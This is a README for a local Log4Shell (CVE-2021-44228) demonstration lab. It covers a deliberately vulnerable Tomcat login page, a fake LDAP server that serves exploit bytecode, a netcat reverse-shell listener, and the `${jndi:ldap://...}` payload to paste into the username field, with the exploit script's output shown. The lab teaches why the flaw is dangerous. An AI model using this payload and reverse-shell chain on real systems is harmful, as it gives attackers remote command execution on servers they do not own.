# log4shell-example

This pieces together a few things across github/internet and makes understanding why the log4shell is so dangerous.

Built/tested rootless containers with `podman and docker` using `x86_64` images.

1) An example tomcat java application that uses log4j and has a login screen to illustrate how easy it is to input exploitable ldap references
2) An LDAP server that will serve the exploit class byte code
   1) The LDAP server is redirected to a basic web server that serves the exploit byte code.  This is written in python that makes system calls out to java to build the exploit java class and produce the java class bytecode.  
   2) It also calls out to java sto start an [LDAP marshaler (serializer)](https://github.com/mbechler/marshalsec)
3) An example of how to create a reverse shell with [netcat (nc)](https://en.wikipedia.org/wiki/Netcat)
4) This uses an exploitable version of java openjdk, u172 `openjdk8:x86_64-ubuntu-jdk8u172` off of docker hub, that has the default of `com.sun.jndi.ldap.object.trustURLCodebase=true`, where java 8 u191 forward has `com.sun.jndi.ldap.object.trustURLCodebase=false`
5) Then we will illustrate how to use some forensics to scrape memory for sensitive information using `yara`

An important thing to note here is that while this demo is running locally, the LDAP server supplying the exploit can be hosted anywhere.



* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>

```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


There is a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
```c
1: ./run-poc.sh <public ip>
```
Once it is running, you can access it on [localhost:8080]()


Now copy the `${jndi:ldap://localhost:1389/a}` and put it into the username field of the tomcat server at port `8080`

You will not be prompted in knowing that the tomcat application has in-fact connected to your netcat running at `9001`  Try typing simple commands like `ls` and see what you get.




